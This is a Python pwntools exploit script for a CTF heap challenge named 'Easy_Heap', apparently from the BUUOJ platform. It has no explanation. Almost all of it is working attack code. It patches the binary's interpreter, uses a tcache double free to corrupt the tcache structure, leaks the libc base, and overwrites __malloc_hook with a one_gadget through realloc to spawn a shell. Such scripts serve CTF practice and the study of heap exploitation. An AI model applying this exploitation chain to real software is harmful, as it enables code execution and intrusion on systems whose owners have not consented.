from pwn import*
from pwn import *
import sys, os
def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
 
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return ELF(path)
def add(size):	#7
	p.sendlineafter('choice: ','1')
	p.sendlineafter('size?',str(size))
def edit(index,content):
	p.sendlineafter('choice: ','2')
	p.sendlineafter('idx?',str(index))
	p.sendafter('content:',content)
def show(index):
	p.sendlineafter('choice: ','3')
	p.sendlineafter('idx?',str(index))
def free(index):		#3
	p.sendlineafter('choice: ','4')
	p.sendlineafter('idx?',str(index))
#p  = remote('node3.buuoj.cn',27061)
elf = change_ld('./Easy_Heap', './ld-2.27.so')
p = elf.process(env={'LD_PRELOAD':'./libc-2.27.so'})
libc = ELF('./libc-2.27.so')
context.log_level = 'debug'
add(0x50)#0
free(0)
free(0)
add(0x50)#1
edit(1,p16(0x7010))
add(0x50)#2
add(0x50)#3 #tcache_count
edit(3,'\xFF'*0x38) #modify tcache_count >7
free(3)
show(3)
libc_base = u64(p.recv(6).ljust(8,'\x00')) - 0x60 - 0x10 - libc.sym['__malloc_hook']
malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc = libc_base + 0x98C39
og = [0x4f2c5,0x4f322,0x10a38c]
one_gadget = libc_base + og[1]
add(0x50) #4 ->tcache_struct
payload = '\x00'*0x48 + p64(malloc_hook-0x13)
edit(4,payload)
add(0x20)
edit(5,'\x00'*(0x13-8) + p64(one_gadget) + p64(realloc))
add(0x10)
p.interactive()
